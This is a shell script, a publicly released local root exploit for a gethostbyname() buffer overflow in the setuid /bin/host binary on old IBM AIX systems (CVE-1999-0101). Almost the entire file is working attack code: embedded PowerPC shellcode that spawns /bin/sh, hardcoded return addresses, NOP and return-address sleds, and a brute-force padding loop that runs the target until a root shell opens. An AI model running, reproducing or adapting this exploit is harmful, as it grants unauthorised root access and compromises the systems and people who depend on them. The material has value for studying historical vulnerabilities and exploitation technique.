#!/bin/sh

#######################################
## Local r00t 'shell-exploit' for:   ##
## gethostbyname() Buffer Overflow   ##
## [ BID 6853 / CVE-1999-0101 ]      ##
##            - - -                  ##
## By Roman Medina-Heigl Hernandez   ##
## aka RoMaNSoFt <roman@rs-labs.com> ##
##                                   ##
## Madrid, 28.Sep.2006               ##
## ================================= ##
## Public release. Version 1.        ##
## --------------------------------- ##
##   -= http://www.rs-labs.com/ =-   ##
#######################################


#############################################################################
#                                                                           #
#  This is merely a proof of concept for what I call a "shell-exploit"      #
#                                                                           #
#  * Original IBM Advisory: ERS-SVA-E01-1996:007.1  (03.Dec.1996)           #
#  * Affected platforms: IBM AIX(r) 3.2.x, 4.1.x, 4.2.x                     #
#  * Exploit tested on: PowerPC-604 running AIX 4.1.4.0                     #
#  * No need to use a compiler, perl, etc. Shell-scripting power!           #
#    Now you know what a pure 'shell-exploit' is  :-)                       #
#  * Syntax:                                                                #
#    % ./rs_aix_host.sh [RET length] [NOP length] [4140|41|42]              #
#                                                                           #
###############################################################--[ EOT ]--###


### Default configuration
ret_length=100
nop_length=300

### Return Address
# AIX 4.1.4.0 - Tested
TGT4140="AIX 4.1.4.0"
RET4140="\057\362\054\330"	# 0x2ff22cd8
# Generic AIX 4.1 - Untested, we assume the former one. Mail me if you have a better guess
TGT41="AIX 4.1.x"
RET41=$RET4140
# Generic AIX 4.2 - Untested, we assume the former one. Mail me if you have a better guess
TGT42="AIX 4.2.x"
RET42=$RET4140

### Shellcode (LSD's Asmcodes - PowerPC/AIX)
#
# char _shellcode[]=        /* 12*4+8 bytes                 */
#    "\x7c\xa5\x2a\x79"     /* xor.    r5,r5,r5             */
#    "\x40\x82\xff\xfd"     /* bnel    <shellcode>          */
#    "\x7f\xe8\x02\xa6"     /* mflr    r31                  */
#    "\x3b\xff\x01\x20"     /* cal     r31,0x120(r31)       */
#    "\x38\x7f\xff\x08"     /* cal     r3,-248(r31)         */
#    "\x38\x9f\xff\x10"     /* cal     r4,-240(r31)         */
#    "\x90\x7f\xff\x10"     /* st      r3,-240(r31)         */
#    "\x90\xbf\xff\x14"     /* st      r5,-236(r31)         */
#    "\x88\x5f\xff\x0f"     /* lbz     r2,-241(r31)         */
#    "\x98\xbf\xff\x0f"     /* stb     r5,-241(r31)         */
#    "\x4c\xc6\x33\x42"     /* crorc   cr6,cr6,cr6          */
#    "\x44\xff\xff\x02"     /* svca                         */
#    "/bin/sh"
# #ifdef V41
#    "\x03"
# #endif
# #ifdef V42
#    "\x02"
# #endif

PARTIALCODE="\
\174\245\052\171\100\202\377\375\177\350\002\246\073\377\001\040\
\070\177\377\010\070\237\377\020\220\177\377\020\220\277\377\024\
\210\137\377\017\230\277\377\017\114\306\063\102\104\377\377\002\
\057\142\151\156\057\163\150\
"
# AIX 4.1
SHELLCODE41=$PARTIALCODE"\003"
# AIX 4.2
SHELLCODE42=$PARTIALCODE"\002"

### NOP
NOP="\117\377\373\202"	# 0x4ffffb82   /* cror 31,31,31 */

### Setuid binary (target)
CMD=/bin/host

### Functions
oct2bin_setup()
{
	# Better to use printf binary if present
	if [ `printf "dSR"` = "dSR" ] >/dev/null 2>&1 ; then
		_PRINTCMD="printf"
		_SYSV=""
	elif [ `echo "RS\c"` = "RS" ] >/dev/null 2>&1 ; then
		# System V
		_PRINTCMD="echo"
		_SYSV="\c"
	else
		# Linux/BSD
		_PRINTCMD="echo -n -e"
		_SYSV=""
	fi

	if ! [ `$_PRINTCMD "dSR"$_SYSV` = "dSR" ] >/dev/null 2>&1 ; then
		echo "Sorry, I don't know how to write raw binary data :-("
		echo "Please, modify oct2bin* functions and try again!"
		exit 2
	fi
}

oct2bin()
{
	$_PRINTCMD $1$_SYSV
}

printhex()
{
	oct2bin $1 | od -t x4 -A n | tr -cd 0123456789abcdefABCDEF
}


### Exploit really starts here...
echo "#######################################"
echo "## Local r00t 'shell-exploit' for:   ##"
echo "## gethostbyname() Buffer Overflow   ##"
echo "## [ BID 6853 / CVE-1999-0101 ]      ##"
echo "##   . . . . . . . . . . . . . . .   ##"
echo "## By: RoMaNSoFt <roman@rs-labs.com> ##"
echo "#######################################"
echo

### Check target binary
if [ -x $CMD -a -u $CMD ] ; then
	echo "[*] Target binary has suid bit [$CMD]"
else
	echo "Sorry, target doesn't exist or it's not suid or cannot be executed"
	exit 3
fi

### We accept (optional) parameters
if [ $1 ] ; then
	ret_length=$1
fi

if [ $2 ] ; then
	nop_length=$2
fi

# Default target platform
TARGET=$TGT4140
RET=$RET4140
SHELLCODE=$SHELLCODE41

if [ $3 ] ; then
	if [ $3 = "4140" ] ; then
		TARGET=$TGT4140
		RET=$RET4140
		SHELLCODE=$SHELLCODE41
	elif [ $3 = "41" ] ; then
		TARGET=$TGT41
		RET=$RET41
		SHELLCODE=$SHELLCODE41
	elif [ $3 = "42" ] ; then
		TARGET=$TGT42
		RET=$RET42
		SHELLCODE=$SHELLCODE42
	fi
fi

### First, we convert octal strings to raw binary
oct2bin_setup
RET=`oct2bin $RET`
NOP=`oct2bin $NOP`
SHELLCODE=`oct2bin $SHELLCODE`

### Second, we create the NOP & RET sleds
echo "[*] Setting up exploitation environment..."

ret_sled=""
i=$ret_length
while [ $i != 0 ]; do
	ret_sled=$ret_sled$RET
	i=$(($i-1))
done

nop_sled=""
i=$nop_length
while [ $i != 0 ]; do
	nop_sled=$nop_sled$NOP
	i=$(($i-1))
done

echo "--> TARGET = $TARGET // RET = 0x"`printhex $RET`" // RETs = $ret_length //"\
     " NOPs = $nop_length <--"

### Prior to exploitation the environment will be un-exported to preserve memory layout
### and previous RET calculations
for i in `env | cut -d= -f1` ; do
	typeset +x $i
done

### Exploit it!
echo "[*] Exploiting..."
PAD="A"
ipad="A"
i=0
SUCCESS=0
while [ $i -lt 4 ]; do
	jpad=""
	j=0
	while [ $j -lt 4 ]; do
		EGG=$ipad$nop_sled$SHELLCODE $CMD $jpad$ret_sled
		if [ $? = 0 ]; then
			SUCCESS=1
			break 2
		fi
		jpad=$PAD$jpad
		j=$(($j+1))
	done
	ipad=$PAD$ipad
	i=$(($i+1))
done

### Finish politely ;-)
if [ $SUCCESS = 1 ]; then
	echo "--> Guessed PAD: EGG = $i // RET = $j <--"
	echo "Owned :-)"
	STATUS=0
else
	echo "Bad luck :-("
	STATUS=1
fi

exit $STATUS

# --[ EOT ]--